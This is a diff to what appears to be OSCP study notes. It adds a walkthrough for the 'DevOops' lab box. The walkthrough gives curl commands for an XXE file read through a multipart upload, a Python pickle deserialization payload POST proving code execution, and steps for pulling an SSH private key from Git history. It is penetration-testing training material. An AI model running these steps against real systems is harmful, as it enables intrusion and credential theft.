@@ -657,6 +657,39 @@ See [[09. Common Web Application Attacks#9.5.3. XXE (XML External Entity Injecti
 
 #### Tags: #XXE #XMLExternalEntity #LocalFileDisclosure #CDATAMethod #ErrorBasedXXE #BlindXXE #OOBExfiltration #ExternalDTD #PHPFilter
 
+### DevOops: multipart XML XXE to source-driven pickle proof
+
+When a custom Python application accepts a file upload containing XML, read the form first and use the exact multipart field. Confirm XXE with `/etc/passwd`, then read the handler source to learn the next request format:
+
+```bash
+boxset UploadURL "http://$BoxIP:$WebPort/upload"
+boxset FileField "file"
+curl -sS "$UploadURL" | tee "$BoxDir/loot/upload.txt"
+curl -sS -F "$FileField=@$BoxDir/exploits/xxe-passwd.xml;filename=feed.xml" \
+  "$UploadURL" | tee "$BoxDir/loot/xxe-passwd.txt"
+```
+
+If source review shows `pickle.loads()` on request-controlled bytes, prove execution with a protocol-compatible payload and a harmless identity command. The response channel is preferable to a callback for the first proof:
+
+```bash
+boxset PickleURL "http://$BoxIP:$WebPort/newpost"
+Payload="$(python3 "$BoxDir/exploits/mkpickle.py" id)"
+curl -sS -X POST --data-binary "$Payload" \
+  -H 'Content-Type: application/octet-stream' "$PickleURL" \
+  | tee "$BoxDir/loot/pickle-id.txt"
+```
+
+Once a shell or SSH foothold exists, search the complete Git history. A removed integration key may remain usable in an earlier commit:
+
+```bash
+git -C "$GitRepo" log --oneline --all
+git -C "$GitRepo" show "$Commit:$HistoryPath" > "$HistoryKeyFile"
+chmod 600 "$HistoryKeyFile"
+ssh-keygen -y -f "$HistoryKeyFile" > /dev/null
+```
+
+Seen in [[OSCP/BOXES/WRITE UPS/Linux/DevOops|DevOops]]. The safe path is `/etc/passwd` proof, source disclosure, `id` proof, mechanical key extraction, then historical Git review.
+
 ### MarkUp: Windows File Read and SSH Key Extraction
 
 For an authenticated XML endpoint that reflects the `<item>` element, test a safe Windows file first, then target a user's key:
@@ -750,6 +783,7 @@ This page turns one repeatable part of an authorized assessment into a checklist
 - [[OSCP/BOXES/WRITE UPS/Linux/Networked|Networked]] -- source archive review, upload-to-webshell execution, and asynchronous filename command injection
 - [[OSCP/BOXES/WRITE UPS/Linux/Poison|Poison]] -- custom PHP file parameter, LFI source review, and safe handling of encoded credential material
 - [[OSCP/BOXES/WRITE UPS/Linux/TartarSauce|TartarSauce]] -- robots/Gobuster triage, aggressive WPScan plugin discovery, and Gwolle RFI validation
+- [[OSCP/BOXES/WRITE UPS/Linux/DevOops|DevOops]] -- multipart XML XXE, source-driven Python pickle proof, SSH-key extraction, and Git-history credential hunting
 
 ## WordPress plugin discovery and Gwolle RFI
 
